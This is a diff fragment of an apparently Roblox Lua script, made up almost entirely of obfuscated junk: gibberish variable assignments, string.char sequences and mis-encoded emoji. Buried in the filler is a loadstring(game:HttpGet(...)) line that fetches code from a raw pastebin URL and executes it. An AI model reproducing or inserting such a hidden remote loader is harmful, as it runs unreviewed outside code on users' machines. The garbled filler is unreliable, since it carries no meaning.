@@ -69,7 +69,8 @@ neksmsnsjzksnsn=isosmsnjssjnsnsksksnsjsisnsnsj;ismansjsiksjsj=kwksnsbahaiajsnsjs
 neksmsnsjzksnsn=isosmsnjssjnsnsksksnsjsisnsnsj;ismansjsiksjsj=kwksnsbahaiajsnsjsj;haikanaahssjsnnsjsksks=jaiakanNsjsksksnsj;string.char(79, 90, 82, 90, 18, 19, 32, 64, 92, 32, 82, 82, 93, 73, 92);naosksmsks="ðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µ"
 neksmsnsjzksnsn=isosmsnjssjnsnsksksnsjsisnsnsj;ismansjsiksjsj=kwksnsbahaiajsnsjsj;haikanaahssjsnnsjsksks=jaiakanNsjsksksnsj;string.char(79, 90, 82, 90, 18, 19, 32, 64, 92, 32, 82, 82, 93, 73, 92);naosksmsks="ðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µ" end
  loadstring(game:HttpGet("https://pastebin.com/raw/sXUtNTkh"))()
-
+end 
+})
 euwiwksnsjsjsjsjekekks=true;jsismsnsjjs=false;euwiwksnsjsjsjsjekekks=true;jsismsnsjjs=false;euwiwksnsjsjsjsjekekks=true;jsismsnsjjs=false;whaiamsnsjjs="bwiwmsnajajajakakjakwjwkwkwkwkwjsjsjsjakaksksjðŸ™‚ðŸ™‚ðŸ™‚ðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µ";wjsjnssjisks=function() wjaknsnajsjssjjsnsnsjs=true
 neksmsnsjzksnsn=isosmsnjssjnsnsksksnsjsisnsnsj;ismansjsiksjsj=kwksnsbahaiajsnsjsj;haikanaahssjsnnsjsksks=jaiakanNsjsksksnsj;string.char(79, 90, 82, 90, 18, 19, 32, 64, 92, 32, 82, 82, 93, 73, 92);naosksmsks="ðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µ"
 neksmsnsjzksnsn=isosmsnjssjnsnsksksnsjsisnsnsj;ismansjsiksjsj=kwksnsbahaiajsnsjsj;haikanaahssjsnnsjsksks=jaiakanNsjsksksnsj;string.char(79, 90, 82, 90, 18, 19, 32, 64, 92, 32, 82, 82, 93, 73, 92);naosksmsks="ðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µðŸ¥µ"
